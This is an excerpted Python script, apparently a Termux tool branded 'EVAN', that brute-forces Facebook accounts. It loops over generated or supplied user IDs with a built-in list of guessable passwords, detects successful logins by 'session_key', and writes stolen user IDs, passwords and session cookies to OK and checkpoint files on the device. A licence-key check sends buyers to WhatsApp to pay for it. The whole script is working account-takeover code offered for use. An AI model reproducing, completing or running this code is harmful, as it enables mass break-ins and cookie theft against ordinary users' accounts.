...
'\033[1;91m'  ________  __     __   ______   __    __       
'\033[1;91m' |        \|  \   |  \ /      \ |  \  |  \      
'\033[1;33m' | $$$$$$$$| $$   | $$|  $$$$$$\| $$\ | $$      
'\033[1;33m' | $$__    | $$   | $$| $$__| $$| $$$\| $$      
'\033[1;91m' | $$  \    \$$\ /  $$| $$    $$| $$$$\ $$      
'\033[1;33m' | $$$$$     \$$\  $$ | $$$$$$$$| $$\$$ $$      
 ...
 '\033[1;32m' \$$$$$$$$     \$     \$$   \$$ \$$   \$$      
  ...
  \033[0;41mEVAN\033[0;92m
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} EVAN☬
 {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G}EVAN
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/X4JU/EVAN.txt/blob/main/EVAN.txt').text
    if id in httpCaht:
      ...
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} EVAN=['+id+']=XD')
      linex()
      ...
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+8801905067662?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}EVAN.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/EVAN_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def bd():
                ...
                with tred(max_workers=30) as MRM:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'i love you','iloveyou','alamin','nabila','halima','jannat','ariyan','nadiya','trisha','@@@###','fflover','sadiya','sabbir','sanjida','EVAN','bangladesh','fariya','113355','shahin','nusrat','jesmin','ayesha','saiful','saidul','nazmul','112200','121234','506070','708090','203040','sarmin','mahadi','aaabbb']
...
def gmail():
                ...
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} EVAN');linex()
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}EVAN🥰-𝐗𝐃{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}❲{G}EVAN🥰-𝐗𝐃_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        	Emon(uid,pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'EVAN-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'EVAN-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}❲{Y}EVAN🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'EVAN-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}EVAN-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} IEVAN🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'EVAN-FILE-M1-OK.txt')
                    open('/sdcard/XD/EVAN-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}EVAN🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'EVAN-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}EVAN-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}EVAN🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'EVAN-FILE-M2-OK.txt')
                    open('/sdcard/XD/EVAN-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}EVAN🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'EVAN-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
